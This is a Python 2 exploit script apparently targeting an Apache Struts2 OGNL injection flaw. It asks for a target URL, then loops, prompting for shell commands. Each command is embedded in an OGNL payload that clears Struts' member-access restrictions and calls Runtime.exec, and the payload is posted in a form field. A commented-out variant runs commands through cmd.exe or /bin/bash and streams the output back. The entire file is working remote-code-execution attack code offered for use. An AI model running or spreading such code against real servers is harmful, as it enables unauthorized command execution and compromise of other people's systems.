#!/usr/bin/python

import requests
import sys
import urllib

def poc(url):
    while True:
        if url.startswith('http://') or url.startswith('https://'):
            cmd=str(raw_input('Please enter the command you want to execute:'))
            payload_1 = "%{"
            payload_1 += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
            payload_1 += "(#_memberAccess?(#_memberAccess=#dm):"
            payload_1 += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
            payload_1 += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
            payload_1 += "(#ognlUtil.getExcludedPackageNames().clear())."
            payload_1 += "(#ognlUtil.getExcludedClasses().clear())."
            payload_1 += "(#context.setMemberAccess(#dm))))."
            payload_1 += "(@java.lang.Runtime@getRuntime().exec('%s'))" % cmd
            payload_1 += "}"

            #payload='''%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}'''
            #payload=payload.replace('id',cmd)

            payload_1=urllib.quote(payload_1)
            data={'name':payload_1,'age':24,'__checkbox_bustedBefore':'true','description':11213123}
            print url,data
            
            header={'Referer':url,'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0','Content-Type':'application/x-www-form-urlencoded'}
            r=requests.post(url,data=data,headers=header)
            print r.text
        else:
            print 'Please add http or https and try again\n'
            return 0


if __name__ == '__main__':
    if len(sys.argv)!=2:
        print 'Please add a domain name!!!'
        sys.exit(0)
    url=str(sys.argv[1])
    poc(url)
